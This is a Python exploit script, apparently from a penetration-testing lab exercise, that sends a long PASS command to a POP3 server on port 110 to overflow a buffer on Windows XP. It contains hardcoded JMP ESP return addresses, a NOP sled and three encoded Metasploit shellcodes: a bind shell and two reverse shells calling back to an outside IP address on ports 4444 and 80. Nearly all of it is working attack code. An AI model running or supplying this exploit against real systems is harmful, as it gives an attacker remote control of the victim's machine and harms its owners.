#!/usr/bin/python
import socket
import sys
import struct

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
## address of JMP esp IN USER32.dll
## 77D8AF0A   FFE4             JMP ESP


## Breakpoint \xcc     dubugger pause

# needs space between encoded shellcode
## needs space before to be decoded
## add 16 nops

##  344
bind_payload =("\x2b\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x22"
"\x47\x12\xb0\x83\xeb\xfc\xe2\xf4\xde\x2d\xf9\xfd\xca\xbe\xed\x4f"
"\xdd\x27\x99\xdc\x06\x63\x99\xf5\x1e\xcc\x6e\xb5\x5a\x46\xfd\x3b"
"\x6d\x5f\x99\xef\x02\x46\xf9\xf9\xa9\x73\x99\xb1\xcc\x76\xd2\x29"
"\x8e\xc3\xd2\xc4\x25\x86\xd8\xbd\x23\x85\xf9\x44\x19\x13\x36\x98"
"\x57\xa2\x99\xef\x06\x46\xf9\xd6\xa9\x4b\x59\x3b\x7d\x5b\x13\x5b"
"\x21\x6b\x99\x39\x4e\x63\x0e\xd1\xe1\x76\xc9\xd4\xa9\x04\x22\x3b"
"\x62\x4b\x99\xc0\x3e\xea\x99\xf0\x2a\x19\x7a\x3e\x6c\x49\xfe\xe0"
"\xdd\x91\x74\xe3\x44\x2f\x21\x82\x4a\x30\x61\x82\x7d\x13\xed\x60"
"\x4a\x8c\xff\x4c\x19\x17\xed\x66\x7d\xce\xf7\xd6\xa3\xaa\x1a\xb2"
"\x77\x2d\x10\x4f\xf2\x2f\xcb\xb9\xd7\xea\x45\x4f\xf4\x14\x41\xe3"
"\x71\x14\x51\xe3\x61\x14\xed\x60\x44\x2f\x03\xec\x44\x14\x9b\x51"
"\xb7\x2f\xb6\xaa\x52\x80\x45\x4f\xf4\x2d\x02\xe1\x77\xb8\xc2\xd8"
"\x86\xea\x3c\x59\x75\xb8\xc4\xe3\x77\xb8\xc2\xd8\xc7\x0e\x94\xf9"
"\x75\xb8\xc4\xe0\x76\x13\x47\x4f\xf2\xd4\x7a\x57\x5b\x81\x6b\xe7"
"\xdd\x91\x47\x4f\xf2\x21\x78\xd4\x44\x2f\x71\xdd\xab\xa2\x78\xe0"
"\x7b\x6e\xde\x39\xc5\x2d\x56\x39\xc0\x76\xd2\x43\x88\xb9\x50\x9d"
"\xdc\x05\x3e\x23\xaf\x3d\x2a\x1b\x89\xec\x7a\xc2\xdc\xf4\x04\x4f"
"\x57\x03\xed\x66\x79\x10\x40\xe1\x73\x16\x78\xb1\x73\x16\x47\xe1"
"\xdd\x97\x7a\x1d\xfb\x42\xdc\xe3\xdd\x91\x78\x4f\xdd\x70\xed\x60"
"\xa9\x10\xee\x33\xe6\x23\xed\x66\x70\xb8\xc2\xd8\xcd\x89\xf2\xd0"
"\x71\xb8\xc4\x4f\xf2\x47\x12\xb0")


##/* win32_reverse -  EXITFUNC=seh LHOST=54.72.28.175 LPORT=4444 Size=312 Encoder=PexFnstenvSub http://metasploit.com */
### Required an SEH exit technique for it to funtion correctly
## EXITFUNC option sets a function in the payload that specifies a DLL and function to call when the payload is complete.
reverse_shell = ("\x29\xc9\x83\xe9\xb8\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xeb"
"\xa2\x95\x2f\x83\xeb\xfc\xe2\xf4\x17\xc8\x7e\x62\x03\x5b\x6a\xd0"
"\x14\xc2\x1e\x43\xcf\x86\x1e\x6a\xd7\x29\xe9\x2a\x93\xa3\x7a\xa4"
"\xa4\xba\x1e\x70\xcb\xa3\x7e\x66\x60\x96\x1e\x2e\x05\x93\x55\xb6"
"\x47\x26\x55\x5b\xec\x63\x5f\x22\xea\x60\x7e\xdb\xd0\xf6\xb1\x07"
"\x9e\x47\x1e\x70\xcf\xa3\x7e\x49\x60\xae\xde\xa4\xb4\xbe\x94\xc4"
"\xe8\x8e\x1e\xa6\x87\x86\x89\x4e\x28\x93\x4e\x4b\x60\xe1\xa5\xa4"
"\xab\xae\x1e\x5f\xf7\x0f\x1e\x6f\xe3\xfc\xfd\xa1\xa5\xac\x79\x7f"
"\x14\x74\xf3\x7c\x8d\xca\xa6\x1d\x83\xd5\xe6\x1d\xb4\xf6\x6a\xff"
"\x83\x69\x78\xd3\xd0\xf2\x6a\xf9\xb4\x2b\x70\x49\x6a\x4f\x9d\x2d"
"\xbe\xc8\x97\xd0\x3b\xca\x4c\x26\x1e\x0f\xc2\xd0\x3d\xf1\xc6\x7c"
"\xb8\xe1\xc6\x6c\xb8\x5d\x45\x47\xdd\xea\x89\x80\x8d\xca\x84\x73"
"\x8d\xf1\x1c\xce\x7e\xca\x79\xd6\x41\xc2\xc2\xd0\x3d\xc8\x85\x7e"
"\xbe\x5d\x45\x49\x81\xc6\xf3\x47\x88\xcf\xff\x7f\xb2\x8b\x59\xa6"
"\x0c\xc8\xd1\xa6\x09\x93\x55\xdc\x41\x37\x1c\xd2\x15\xe0\xb8\xd1"
"\xa9\x8e\x18\x55\xd3\x09\x3e\x84\x83\xd0\x6b\x9c\xfd\x5d\xe0\x07"
"\x14\x74\xce\x78\xb9\xf3\xc4\x7e\x81\xa3\xc4\x7e\xbe\xf3\x6a\xff"
"\x83\x0f\x4c\x2a\x25\xf1\x6a\xf9\x81\x5d\x6a\x18\x14\x72\xfd\xc8"
"\x92\x64\xec\xd0\x9e\xa6\x6a\xf9\x14\xd5\x69\xd0\x3b\xca\x65\xa5"
"\xef\xfd\xc6\xd0\x3d\x5d\x45\x2f")


###port 80 version for use if a firewall blocks other
## shouldnt be an issue but i will leave this here all the same
##/* win32_reverse -  EXITFUNC=seh LHOST=54.72.28.175 LPORT=80 Size=312 Encoder=PexFnstenvSub http://metasploit.com */
Rev_port80 = ("\x2b\xc9\x83\xe9\xb8\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xeb"
"\xf7\xb6\x48\x83\xeb\xfc\xe2\xf4\x17\x9d\x5d\x05\x03\x0e\x49\xb7"
"\x14\x97\x3d\x24\xcf\xd3\x3d\x0d\xd7\x7c\xca\x4d\x93\xf6\x59\xc3"
"\xa4\xef\x3d\x17\xcb\xf6\x5d\x01\x60\xc3\x3d\x49\x05\xc6\x76\xd1"
"\x47\x73\x76\x3c\xec\x36\x7c\x45\xea\x35\x5d\xbc\xd0\xa3\x92\x60"
"\x9e\x12\x3d\x17\xcf\xf6\x5d\x2e\x60\xfb\xfd\xc3\xb4\xeb\xb7\xa3"
"\xe8\xdb\x3d\xc1\x87\xd3\xaa\x29\x28\xc6\x6d\x2c\x60\xb4\x86\xc3"
"\xab\xfb\x3d\x38\xf7\x5a\x3d\x08\xe3\xa9\xde\xc6\xa5\xf9\x5a\x18"
"\x14\x21\xd0\x1b\x8d\x9f\x85\x7a\x83\x80\xc5\x7a\xb4\xa3\x49\x98"
"\x83\x3c\x5b\xb4\xd0\xa7\x49\x9e\xb4\x7e\x53\x2e\x6a\x1a\xbe\x4a"
"\xbe\x9d\xb4\xb7\x3b\x9f\x6f\x41\x1e\x5a\xe1\xb7\x3d\xa4\xe5\x1b"
"\xb8\xb4\xe5\x0b\xb8\x08\x66\x20\xdd\xbf\xaa\xe7\x8d\x9f\xb6\x18"
"\x8d\xa4\x3f\xa9\x7e\x9f\x5a\xb1\x41\x97\xe1\xb7\x3d\x9d\xa6\x19"
"\xbe\x08\x66\x2e\x81\x93\xd0\x20\x88\x9a\xdc\x18\xb2\xde\x7a\xc1"
"\x0c\x9d\xf2\xc1\x09\xc6\x76\xbb\x41\x62\x3f\xb5\x15\xb5\x9b\xb6"
"\xa9\xdb\x3b\x32\xd3\x5c\x1d\xe3\x83\x85\x48\xfb\xfd\x08\xc3\x60"
"\x14\x21\xed\x1f\xb9\xa6\xe7\x19\x81\xf6\xe7\x19\xbe\xa6\x49\x98"
"\x83\x5a\x6f\x4d\x25\xa4\x49\x9e\x81\x08\x49\x7f\x14\x27\xde\xaf"
"\x92\x31\xcf\xb7\x9e\xf3\x49\x9e\x14\x80\x4a\xb7\x3b\x9f\x46\xc2"
"\xef\xa8\xe5\xb7\x3d\x08\x66\x48")



### 7C9D30D7   FFE4             JMP ESP
### address for XP SP3
WINXPSP3 = struct.pack('<L',0x7C9D30D7)
WINXPSP2 = struct.pack('<L',0x7C941EED)

## RET address 7C 94 1E ED
##  "\xED\x1E\x94\x7C"


### 320 bytes for payload
                    
buff = '\x41' * 4654 + WINXPSP2 + '\x90' * 16 +  reverse_shell  + '\xCC' * 8



print "\nSending evil buffer..." 
s.connect(('10.0.0.108',110))
data = s.recv(1024)
s.send('USER offsec' + '\r\n')
data = s.recv(1024)
print data
s.send('PASS ' + buff + '\r\n')
data = s.recv(1024)
print data
s.close()
